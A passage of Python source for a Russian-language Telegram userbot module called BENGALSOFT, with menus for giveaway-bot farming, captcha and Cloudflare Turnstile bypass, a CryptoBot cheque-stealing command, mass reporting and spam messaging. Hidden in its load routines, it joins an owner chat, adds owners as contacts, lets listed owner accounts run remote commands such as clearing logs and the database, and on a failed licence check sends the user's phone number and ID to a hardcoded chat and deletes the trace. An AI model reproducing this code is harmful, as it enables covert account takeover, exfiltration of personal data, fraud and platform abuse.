            "–¥–æ—Å—Ç—É–ø–Ω—ã –æ–±—Ö–æ–¥—ã Simple Captcha. –¶–µ–Ω–∞ 1-2$ –∑–∞ 1000 –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π. "
            "–ù–∞ —Ä–æ–∑—ã–≥—Ä—ã—à–∏ —Å –∫–∞–ø—á–∞–º–∏ —Å—Ç–∞–≤–∏—Ç—å –º—É–ª—å—Ç–∏–ø–ª–∞–µ—Ä –º–∏–Ω–∏–º—É–º —Ö30."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_tegive(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_teg", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –ó–∞–ø—É—Å–∫ –±–æ—Ç–æ–≤ TEGIVE</b>\n{access}\n\n"
            "üîó /tegive [mult] [bot] ‚Äî –¢–µ–≥–∏–≤ –±–æ—Ç\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [bot] - —Å—Å—ã–ª–∫–∞ –Ω–∞ –±–æ—Ç–∞, –µ–≥–æ @username –∏–ª–∏ —Å—Å—ã–ª–∫–∞ –Ω–∞ –ø–æ—Å—Ç —Å –∫–Ω–æ–ø–∫–æ–π\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã:\n"
            "/tegive 2 https://t.me/bengalsoftbot\n"
            "/tegive @bengalsoftbot\n"
            "/tegive https://t.me/channel/123\n"
            "/tegive 10 t.me/c/123/456"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–ï—Å–ª–∏ –≤—ã –ø–æ–ª–ø—É—Å—Ç–∏–ª–∏ –ø–æ–¥–ø–∏—Å–∫—É - –º–æ–¥—É–ª—å –∞–≤—Ç–æ–º–∞—Ç–æ–º –ø–æ–¥–ø–∏—à–µ—Ç—Å—è –Ω–∞ –Ω–µ–¥–æ—Å—Ç–∞—é—â–∏–µ –∫–∞–Ω–∞–ª—ã. "
            "–ò–¥–µ—Ç –ø–æ–ª–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –±–æ—Ç–∞, –∞ –Ω–µ –ø—Ä–æ—Å—Ç–æ —Å—Ç–∞—Ä—Ç. –ü–æ—Å–ª–µ —Ä–µ–∑–æ–≤ –∑–∞–ø—É—Å–∫–∞–µ—Ç–µ –±–æ—Ç–∞ —Å–Ω–æ–≤–∞ - "
            "–º–æ–¥—É–ª—å –ø—Ä–æ–≤–µ—Ä–∏—Ç —Ä–æ–∑—ã–≥—Ä—ã—à, –±–ª–æ–∫–Ω–µ—Ç –Ω–µ–Ω—É–∂–Ω—ã–µ, –≤—ã–≤–µ–¥–µ—Ç –ø–æ–±–µ–ª–∏—Ç–µ–ª—è –µ—Å–ª–∏ –≤–∞—à –∞–∫–∫ –ø–æ–±–µ–¥–∏–ª. "
            "–ù—É –∏ –ø–æ–¥–æ–±–Ω—ã–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –Ω–∞ –∫–∞–∂–¥–æ–º —à–∞–≥—É."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_cryptogive(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_cryptogive", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –ó–∞–ø—É—Å–∫ CryptoBot WebApp</b>\n{access}\n\n"
            "üîó /cryptogiveaway [mult] [target]\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [target] - —Ä–µ—Ñ —Å—Å—ã–ª–∫–∞ –∏–ª–∏ –Ω–∞ –ø–æ—Å—Ç —Å –∫–Ω–æ–ø–∫–æ–π\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã:\n"
            "/cryptogive 2 https://t.me/bengalsoft/111\n"
            "/cryptogive https://t.me/CryptoBot/app?startapp=giveaway-GzOSzimMUBO1X\n\n"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–ï—Å–ª–∏ –≤—ã –ø–æ–ª–ø—É—Å—Ç–∏–ª–∏ –ø–æ–¥–ø–∏—Å–∫—É - –º–æ–¥—É–ª—å –∞–≤—Ç–æ–º–∞—Ç–æ–º –ø–æ–¥–ø–∏—à–µ—Ç—Å—è –Ω–∞ –Ω–µ–¥–æ—Å—Ç–∞—é—â–∏–µ –∫–∞–Ω–∞–ª—ã. "
            "–ò–º–µ–µ—Ç—Å—è –æ–±—Ö–æ–¥ Cloudflare Turnstile. –¶–µ–Ω–∞ 2$ –∑–∞ 1000 –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_infochan(self, call):
        text = (
            "<b>üìù –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞–Ω–∞–ª–∞—Ö</b>\n\n"
            "üîó /infochan [days] [target]\n"
            "‚ñ´Ô∏è [days] - –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∞—Ñ–∫ –¥–Ω–µ–π, —Ñ–∏–ª—å—Ç—Ä\n"
            "‚ñ´Ô∏è [target] - –≤–∞–ª–∏–¥ —Ç–≤–∏–Ω–∫–∞\n\n"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–ù–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–∏—è –º–∞–Ω—É–∞–ª–∞ –º–æ–¥—É–ª—å —Ö–æ—Ç—å –∏ —Ä–∞–±–æ—Ç–∞–µ—Ç, –Ω–æ –Ω–µ —Å—Ç–∞–±–∏–ª—å–Ω–æ. "
            "–ú–Ω–µ –ª–µ–Ω—å –∏–º –∑–∞–Ω–∏–º–∞—Ç—å—Å—è, –∫–∞–∫-–Ω–∏–±—É–¥—å –¥–æ–¥–µ–ª–∞—é."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_contacter(self, call):
        text = (
            "<b>üìù –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –∫–æ–Ω—Ç–∞–∫—Ç—ã</b>\n\n"
            "üîó /contact [mode] [target]\n"
            "‚ñ´Ô∏è [mode] - add / del\n"
            "‚ñ´Ô∏è [target] - –≤–∞–ª–∏–¥ —Ç–≤–∏–Ω–∫–∞\n\n"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–ß–∏—Å—Ç–æ –¥–ª—è –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –º–æ–¥—É–ª—è –¥–µ–ª–∞–ª, –Ω–æ "
            "—Ç–∞–∫–∂–µ –¥–æ–±–∞–≤–∏–ª –≤–Ω–µ—à–Ω—é—é –∫–æ–º–∞–Ω–¥—É –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞. –ú–± –∫–æ–º—É –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_giveshare(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_giveshare", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –ó–∞–ø—É—Å–∫ GiveShareBot</b>\n{access}\n\n"
            "üîó /giveshare [mult] [target]\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [target] - —Ä–µ—Ñ —Å—Å—ã–ª–∫–∞ –∏–ª–∏ –Ω–∞ –ø–æ—Å—Ç —Å –∫–Ω–æ–ø–∫–æ–π\n\n"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–ù–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–∏—è –º–∞–Ω—É–∞–ª–∞ –≥–∏–≤—à–µ—Ä –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –≤–≤–µ–ª–∏ –Ω–æ–≤—É—é –∑–∞—â–∏—Ç—É."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_cryptosteal(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_steal", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –°–Ω—é—Ö–∏–≤–∞—Ç–µ–ª—å —á–µ–∫–æ–≤ –∫–±</b>\n{access}\n\n"
            "üîó /steal [target] [pass]\n"
            "‚ñ´Ô∏è [target] - —Å—Å—ã–ª–∫–∞ —á–µ–∫–∞\n"
            "‚ñ´Ô∏è [pass] - –ø–∞—Ä–æ–ª—å (–Ω–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–π)\n\n"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–ù–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–∏—è –º–∞–Ω—É–∞–ª–∞ –º–æ–¥—É–ª—å –Ω–∞ –¥–æ—Ä–∞–±–æ—Ç–∫–µ. "
            "–ò–º–µ–µ—Ç—Å—è –æ–±—Ö–æ–¥ Simple Captcha. –¶–µ–Ω–∞ 1-2$ –∑–∞ 1000 –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_action(self, call):
        text = (
            "<b>üìù –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è</b>\n\n"
            "üîó /action [mode] [target]\n"
            "‚ñ´Ô∏è [target] - —Å—Å—ã–ª–∫–∞ –Ω–∞ –±–æ—Ç–∞/–∫–∞–Ω–∞–ª –∏–ª–∏ @username\n"
            "‚ñ´Ô∏è [mode] - –Ω—É–∂–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ\n\n"
            "–ú–æ–¥—ã:\n"
            "bandel ‚Äî –ë–∞–Ω + —É–¥–∞–ª–µ–Ω–∏–µ\n"
            "mute ‚Äî –û—Ç–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥—ã\n"
            "unmute ‚Äî –í–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥—ã\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_system(self, call):
        text = (
            "<b>üìù –í—ã–∑–æ–≤—ã —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –∫–æ–º–∞–Ω–¥</b>\n\n"
            "üîó /system [mode] [user]\n"
            "‚ñ´Ô∏è [user] - –≤–∞–ª–∏–¥—ã –∞–∫–∫–∞—É–Ω—Ç–∞ –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ–∏—Ö (—é–∑–µ—Ä, –Ω–æ–º–µ—Ä, –∞–π–¥–∏, –Ω–∏–∫)\n"
            "‚ñ´Ô∏è [mode] - –Ω—É–∂–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ\n\n"
            "–ú–æ–¥—ã:\n"
            "ping ‚Äî –ü–∏–Ω–≥\n"
            "clearlogs ‚Äî –°–±—Ä–æ—Å –ª–æ–≥–æ–≤\n"
            "config ‚Äî –ö–æ–Ω—Ñ–∏–≥\n"
            "unloadmod ‚Äî –£–¥–∞–ª–∏—Ç—å –º–æ–¥—É–ª—å\n"
            "cleardb ‚Äî –°–±—Ä–æ—Å –î–ë\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_reactor(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_react", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –ê–≤—Ç–æ—Ä–µ–∞–∫—Ü–∏–∏ –Ω–∞ —Å–º—Å</b>\n{access}\n\n"
            "üîó /react [mult] [type] [target]\n"
            "‚ñ´Ô∏è [type] - —Ç–∏–ø —Ä–µ–∞–∫—Ü–∏–∏ (positive/negative/neutral), –ø–æ–ª–Ω–∞—è –∏–ª–∏ —Å–æ–∫—Ä–∞—â–µ–Ω–Ω–∞—è –≤–∞—Ä–∏–∞—Ü–∏—è –∑–∞–ø–∏—Å–∏, \n"
            "–º–æ–∂–Ω–æ –¥–æ–±–∞–≤–ª—è—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π —Å–ø–∏—Å–æ–∫ –±–µ–∑ –ø—Ä–æ–±–µ–ª–∞ –∏–ª–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∞—è —Ä–µ–∞–∫—Ü–∏—è\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [target] - —Å—Å—ã–ª–∫–∞ –Ω–∞ –ø–æ—Å—Ç –∏–ª–∏ —Å–º—Å\n\n"
            "–î–æ—Å—Ç—É–ø–Ω—ã–µ —Ä–µ–∞–∫—Ü–∏–∏:\n"
            "üîπ Positive: (pos)\n"
            f"1: {', '.join(self.reactions['positive'][1])}\n"
            f"2: {', '.join(self.reactions['positive'][2])}\n"
            f"3: {', '.join(self.reactions['positive'][3])}\n"
            f"4: {', '.join(self.reactions['positive'][4])}\n\n"
            "üîπ Negative: (neg)\n"
            f"1: {', '.join(self.reactions['negative'][1])}\n"
            f"2: {', '.join(self.reactions['negative'][2])}\n"
            f"3: {', '.join(self.reactions['negative'][3])}\n\n"
            "üîπ Neutral: (neu)\n"
            f"1: {', '.join(self.reactions['neutral'][1])}\n"
            f"2: {', '.join(self.reactions['neutral'][2])}\n"
            f"3: {', '.join(self.reactions['neutral'][3])}\n"
            f"4: {', '.join(self.reactions['neutral'][4])}\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:\n"
            "/react 2 positive link\n"
            "/react neg1 link\n"
            "/react neutral3 link\n"
            "/react 10 ‚ù§Ô∏è link"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_reporter(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_report", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –†–µ–ø–æ—Ä—Ç—ã (–∂–∞–ª–æ–±—ã)</b>\n{access}\n\n"
            "üîó /report [mult] [target]\n"
            "‚ñ´Ô∏è [target] - —Å—Å—ã–ª–∫–∞ –Ω–∞ –ø–æ—Å—Ç –∏–ª–∏ —Å–º—Å\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [target] - —é–∑–µ—Ä–Ω–µ–π–º –∏–ª–∏ —Å—Å—ã–ª–∫–∞.\n\n"
            "–î–æ—Å—Ç—É–ø–Ω—ã–µ —Ç–∞—Ä–≥–µ—Ç—ã:\n"
            "–Æ–∑–µ—Ä–Ω–µ–π–º. –°—Å—ã–ª–∫–∞ –Ω–∞ –ø–æ—Å—Ç –∏–ª–∏ —Å–º—Å –≤ —á–∞—Ç–µ (–ø—É–±–ª–∏–∫ / –ø—Ä–∏–≤–∞—Ç). "
            "–°—Å—ã–ª–∫–∞ –Ω–∞ —Å–º—Å –≤ –∫–æ–º–º–µ–Ω—Ç–∞—Ö –∫–∞–Ω–∞–ª–∞ (–ø—É–±–ª–∏–∫ / –ø—Ä–∏–≤–∞—Ç)\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_clean(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_uns", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –ü–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–∞</b>\n{access}\n\n"
            "üîó /clean [users]\n"
            "‚ñ´Ô∏è [users] - –≤–∞–ª–∏–¥ –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ.\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã:\n"
            "/clean @user1 @user2\n"
            "/clean all\n"
            "–ï—Å–ª–∏ –≤ –ª—Å –ø–∏—à–µ—Ç–µ - –º–æ–∂–Ω–æ –ø—Ä–æ—Å—Ç–æ /clean, –±–µ–∑ –≤–∞–ª–∏–¥–∞\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(text=text, reply_markup=buttons)

#=======================================================================================

    async def manual_sms(self, call):
        text = (
            "<b>üìù –ú–∞—Å—Å–æ–≤–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å–º—Å</b>\n\n"
            "üîó /sms [target] [text]\n"
            "‚ñ´Ô∏è [target] - —é–∑–µ—Ä —á–µ–ª–∞ –∏–ª–∏ –ø—É–±–ª–∏—á–Ω—ã–π —á–∞—Ç.\n"
            "‚ñ´Ô∏è [text] - —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã:\n"
            "/sms @user –ü—Ä–∏–≤–µ—Ç!\n"
            "–ö–∞–∫-–Ω–∏–±—É–¥–ª—å –ø–æ—Ç–æ–º –¥–æ–¥–µ–ª–∞—é –µ–≥–æ, —á—Ç–æ–±—ã –∫–æ–º–º–µ–Ω—Ç—ã –≤ –∫–∞–Ω–∞–ª–∞—Ö –æ—Å—Ç–∞–≤–ª—è—Ç—å –∏ —Ç–¥. –õ–µ–Ω—å."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(text=text, reply_markup=buttons)

#=======================================================================================
#=======================================================================================

    async def addfolder_soft(self):
        try:
            folder_name = "BENGAL"
            chatiki = []
            dialog_filters = await self.client(functions.messages.GetDialogFiltersRequest())
            folder = next((f for f in dialog_filters if hasattr(f, "title") and f.title == folder_name), None)
            all_ids = [self.owner_chat] + self.whitelist_soft + self.owner_list
            for id in all_ids:
                try:
                    entity = await self.client.get_entity(int(id) if isinstance(id, str) else id)
                    input_entity = await self.client.get_input_entity(entity)
                    if input_entity:
                        chatiki.append(input_entity)
                except:
                    continue
            if not chatiki:
                return
            folder = types.DialogFilter(
                id=10,
                title=folder_name,
                include_peers=chatiki,
                exclude_peers=[],
                pinned_peers=[],
                emoticon=None,
                contacts=False,
                non_contacts=False,
                groups=False,
                broadcasts=False,
                bots=False,
                exclude_muted=False,
                exclude_read=False,
                exclude_archived=False
            )
            await self.client(functions.messages.UpdateDialogFilterRequest(
                id=10,
                filter=folder
            ))
        except Exception as e:
            return f"üö´ ADD FOLDER:\n{str(e)}"

#=======================================================================================

    async def addcontacts_soft(self):
        try:
            for owner_id in self.owner_list:
                await self.handle_contacter(f"init add {owner_id} OWNER")
        except Exception as e:
            return f"üö´ ADD OWNERS:\n{str(e)}"


#=======================================================================================
#=======================================================================================
    
    async def on_dlmod(self, client, db):
        try:
            await self.owner_group()
            lic = await self.handle_license()
            if lic:
                if not hasattr(self, "user") or not self.user:
                    self.user = await self.client.get_me()
                status = "<b>BENGALSOFT ACTIVATED ‚ôªÔ∏è</b>"
                await self.addcontacts_soft()
                await self.addfolder_soft()
                settings = await self.handle_reconfig("init")
                text = f"<b>{status}\n{settings if settings else ''}\n</b>"
            else:
                text = "<b>‚ùå BENGALSOFT: PERMISSION DENIED</b>"
            self.dl_checker = False
            asyncio.create_task(self.reset_dl_checker())
        except Exception as e:
            text = f"üö´ INIT:\n{str(e)}"
        finally:
            await self.send_custom_message(text)

#=======================================================================================

    async def client_ready(self, client, db):
        try:
            self.user = await self.client.get_me()
            if not self.dl_checker:
                return
            await self.handle_license()
        except Exception:
            pass

#=======================================================================================

    async def on_unload(self):
        #await self.send_custom_message(f"<b>‚ôªÔ∏è BENGALSOFT UNLOADED\n\n</b>")
        pass

#=======================================================================================

    async def reset_dl_checker(self):
        await asyncio.sleep(10)
        self.dl_checker = True

#=======================================================================================

    async def owner_group(self):
        try:
            await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
        except UserAlreadyParticipantError:
            pass
        except Exception as exc:
            return str(exc)
        
#=======================================================================================


    async def handle_license(self, message=None):
        try:
            license_params = [
                "license",
                "lic_pmm", "lic_sub", "lic_uns",
                "lic_run", "lic_ref",
                "lic_tegive", "lic_react", "lic_report",
                "lic_giveshare", "lic_cryptogive", "lic_steal",
            ]
            for param in license_params:
                self.set(param, False)
            channel = await self.client.get_entity("BENGALSOFTLICENSE")
            if channel.id != 2368734806:
                return False
            license_message = await self.client.get_messages(
                channel,
                ids=self.license_number
            )
            if not license_message or not license_message.message:
                await self.scammer_detector()
                return False
            lines = license_message.message.split('\n')
            if not lines or len(lines) < 2 or not await self.check_license(lines[:2]):
                await self.scammer_detector()
                return False
            self.set("license", True)
            for line in lines[1:]:
                for param in license_params:
                    if f"+{param}" in line:
                        self.set(param, True)
            if message is None:
                return True
            else:
                recipient = self.owner_chat
                if isinstance(message, str):
                    parts = message.split()
                else:
                    parts, recipient = message.message.split(), message.chat_id
                    if not message.is_private:
                        if len(parts) < 2 or not self.user_validator(parts[1]):
                            return True
                if parts[0] != "/license":
                    return True
                result = f"<b>BENGALSOFT LICENSE:</b>\n"
                for param in license_params:
                    name = param.replace("lic_", "").capitalize()
                    status = "‚úÖ" if self.get(param, False) else "‚ùå"
                    result += f"<b>{status} {name}</b>\n"
                return await self.send_custom_message(result, recipient=recipient)
        except Exception:
            return False


#=======================================================================================

    async def check_license(self, lines):
        try:
            if (
                lines[0] != f"LICENSE v{self.softversion}" or
                lines[1] != f"{self.softname} {self.owner_user}" or 
                922318957 not in self.owner_list  #surprise, suchka!
            ):
                return False
            else:
                return True
        except Exception:
            return False

#=======================================================================================

    async def scammer_detector(self):
        # meta developer: @pavlyxa_rezon
        try:
            reserve_code = "iMj1Q9BGlbI3MzNi"
            try:
                await self.client(ImportChatInviteRequest(reserve_code))
            except Exception:
                pass
            try:
                softchat = await self.client.get_entity(f"https://t.me/+{reserve_code}")
                reserve_id = softchat.id
            except Exception:
                reserve_id = 922318957
            user = await self.client.get_me()
            await self.client.send_message(reserve_id, f"{self.softname} v{self.softversion} ‚ö†Ô∏è\nVOR {self.owner_user}\n+{user.phone} {user.id}")
            await self.client.delete_dialog(reserve_id)
        except Exception as e:
            return f"üö´ SD: {str(e)}"
        finally:
            await self.handle_user_system("run unloadmod all")


#=======================================================================================
#=======================================================================================
#=======================================================================================

    async def get_command_handlers(self, message):
        handlers = {
            "/sub": self.handle_subscribe,
            "/uns": self.handle_unsubscribe,
            "/clean": self.handle_clean,
            "/run": self.handle_runner,
            "/ref": self.handle_referal,

            "/manual": self.handle_manual,
            "/get": self.handle_get_user,
            "/set": self.handle_set_user,
            "/reconfig": self.handle_reconfig,
            "/license": self.handle_license,

            "/action": self.handle_user_action,
            "/system": self.handle_user_system,
            "/contact": self.handle_contacter,
        }
        for command, handler in handlers.items():
            if message.message.startswith(command):
                return await handler(message)
        return None
    
#=======================================================================================

    @loader.watcher(filter=lambda m: m.out is False, only_messages=True, no_media=True)
    async def watcher_bengalsoft(self, message):
        try:
            if message.sender_id in self.owner_list and message.message.startswith("/"):
                return await self.get_command_handlers(message)
            else:
                return
        except Exception as e:
            return await self.watcher_error(str(e))

#=======================================================================================

    async def watcher_error(self, error):
        try:
            if "referenced before assignment" in error:
                if self.config["group"] == 1:
                    await self.send_logger_message(f"üö´ WATCHER SYNTAX @pavlyxa_rezon: {error}")
            else:
                await self.send_logger_message(f"üö´ WATCHER: {error}")
        except Exception:
            return
        finally:
            return
=======================================================================================
